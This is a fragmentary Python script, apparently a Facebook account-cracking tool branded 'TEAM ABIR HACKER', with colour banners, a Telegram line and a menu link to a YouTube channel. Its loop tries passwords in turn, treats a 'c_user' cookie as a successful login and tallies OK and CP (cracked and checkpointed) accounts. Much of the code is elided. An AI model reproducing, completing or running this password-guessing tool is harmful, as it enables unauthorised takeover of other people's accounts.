...
\033[1;31m│\033[1;37m☞  \033[1;32mTELEGRAM   \033[1;31m ➟  \033[1;32m    chalai nah    \033[1;31m
...
\033[1;37m╚\033[1;36mⓉⒷⒽ\033[1;37m══════\033[41m\033[1;37m[ 𓆩𝐓𝐄𝐀𝐌𓆪 𓆩𝘼𝘽𝙄𝙍𓆪  𓆩𝙃𝘼𝘾𝙆𝙀𝙍𓆪 ]\x1b[0m══════\033[1;36m🆃🅰🅷 
...
def XYZ():
    ...
    if WASIM in ["1","01"]:
        ...
        os.system("xdg-open https://youtube.com/@abirnotking?si=Hw-dO6UKVCwBjUU7")
        XYZ()
    elif WASIM in ["0","00"]:
       exit()
    else:
    ...
    try:
        for ps in pwx:
            ...
            if 'c_user' in log_cookies:
                ...
                continue
        loop+=1
        sys.stdout.write(f'\r\33[1;37m[𝘼𝘽𝙄𝙍 🔥] [%s] \33[1;97m[OK:%s{WASIM2}CP:%s]'%(loop,len(ok),len(cp))), 
        sys.stdout.flush()
    except:
        pass
